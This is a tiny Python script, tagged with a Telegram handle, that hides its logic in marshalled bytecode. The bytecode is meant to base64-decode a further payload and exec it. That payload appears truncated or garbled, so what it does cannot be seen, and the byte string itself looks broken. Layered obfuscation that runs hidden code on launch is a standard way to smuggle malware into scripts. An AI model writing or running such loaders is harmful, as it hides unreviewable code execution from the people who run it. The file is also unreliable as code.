#Telegram: @rafi_broh


import marshal
exec(marshal.loads(b'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3<\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x01\x02\x00e\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xab\x01\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00y\x01)\x03\xe9\x00\x00\x00\x00Ns4<\x00\)\x03\xda\x06base64\xda\x04exec\xda\tb64decode\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xda\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s+\x00\x00\x00\xf0\x03\x01\x01\x01\xdb\x00\r\xd9\x00\x04\xd0\x05\x15\x80V\xd7\x05\x15\xd1\x05\x15\xf0\x00\x00\x17Nq\x03\xf3\x00\x00\x06Oq\x03\xf5\x00\x00\x01Pq\x03r\x06\x00\x00\x00'))
